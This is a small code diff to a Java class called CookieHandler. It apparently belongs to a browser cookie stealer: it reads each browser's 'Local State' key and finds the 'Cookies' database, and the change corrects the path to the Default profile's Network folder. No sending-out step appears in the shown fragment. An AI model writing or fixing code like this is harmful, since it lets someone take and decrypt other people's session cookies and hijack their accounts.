@@ -49,7 +49,7 @@ public class CookieHandler {
             File userData = new File(paths.get(browser));
             if (!userData.exists()) continue;
             byte[] key = getKey(new File(userData, "Local State"));
-            File networkDir = new File(userData, "Network");
+            File networkDir = new File(userData, "\\Default\\Network");
             if (!networkDir.exists()) continue;
             for (File data : networkDir.listFiles()) {
                 if (data.getName().equals("Cookies")) {
